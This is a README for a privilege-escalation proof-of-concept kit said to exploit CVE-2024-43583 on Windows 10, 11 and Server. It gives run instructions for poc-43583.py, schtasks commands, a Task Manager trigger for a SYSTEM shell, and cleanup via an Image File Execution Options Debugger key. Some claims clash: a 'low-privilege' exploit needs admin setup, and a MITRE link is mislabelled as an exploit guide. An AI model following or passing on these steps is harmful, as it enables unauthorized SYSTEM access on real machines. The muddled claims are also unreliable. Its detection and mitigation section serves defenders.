# Windows UAC Authentication Bypass Kit

This repository contains a Proof of Concept (PoC) demonstrating a Windows User Account Control (UAC) authentication bypass related to improper trust of third-party components.

The project was developed for academic purposes to illustrate how misconfigured trust boundaries can allow unintended elevated execution.

## Contents
- Presentation explaining the vulnerability
- Two demonstrations showing different PoC scenarios

## Affected Windows Versions
Windows Versions Affected

Windows 10 (1507 - 22H2) 
Windows 11 (21H2 - 24H2)
Windows Server 2008 SP2 - 2022 

## ⚠️ Disclaimer
> This exploit is for **educational and research purposes only**. Do not use it on unauthorized systems. Misuse of this exploit may be illegal.

---

## Exploit Usage
### **Setup**
Ensure Python is installed on the target system. If not, use the compiled `.exe` version.

### **Run the Exploit**
#### **Option 1: Run Directly from a Low-Privileged User**
```cmd
python poc-43583.py
```

#### **Option 2: Run via Task Scheduler**
1. **Create Scheduled Task:**  (Run as Administrator)
   ```powershell
   schtasks /create /tn "LowPrivExploit" /tr "C:\Path\To\python.exe C:\Path\To\poc-43583.py" /sc once /st 00:00 /ru lowpriv /f
   ```
2. **Run Task:**
   ```powershell
   schtasks /run /tn "LowPrivExploit"
   ```
3. **Trigger the Exploit:** Open Task Manager (`Ctrl + Shift + Esc`). If successful, a SYSTEM shell will appear instead.

### ** Verify Privilege Escalation**
Once the exploit runs, check your privileges:
```cmd
whoami
```
Expected Output:
```
nt authority\system
```

---

## 🛠️ Cleanup
### **Method 1: Use the PoC to Restore Defaults**
Re-run the script and select **option [2]** to remove the hijack.

### **Method 2: Manually Delete the Registry Key**
1. Open **Administrator Command Prompt**.
2. Run:
   ```cmd
   reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /f
   ```
3. **Delete the Scheduled Task (if used):**
   ```powershell
   schtasks /delete /tn "LowPrivExploit" /f
   ```

---

## Detection & Mitigation
- **Check for unexpected Debugger keys:**
  ```powershell
  reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
  ```
- **Enable Windows Defender Tamper Protection** to prevent registry modifications.
- **Use EDR/SIEM solutions** to detect unauthorized registry changes.

---

## 📝 References
- [Microsoft Security Advisory](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43583)
- [Exploit Development Guide](https://attack.mitre.org/techniques/T1546/)
